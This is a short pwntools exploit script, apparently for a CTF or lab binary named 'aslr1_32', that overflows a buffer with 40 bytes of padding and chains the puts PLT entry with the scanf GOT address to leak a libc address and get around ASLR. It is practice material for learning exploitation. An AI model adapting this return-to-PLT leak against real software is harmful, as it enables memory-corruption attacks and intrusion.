from pwn import *

p = process("./aslr1_32")
elf = ELF("./aslr1_32")

print hex(elf.plt['puts'])
# print hex(elf.got['scanf'])

# puts_plt = hex(elf.plt['puts'])
puts_plt = p32(0x8049036)
scanf_got = p32(0x804c014)

payload = "A"*40
payload += puts_plt
payload += "AAAA"
payload += scanf_got

p.sendlineafter("ASLR!",payload)
p.interactive()




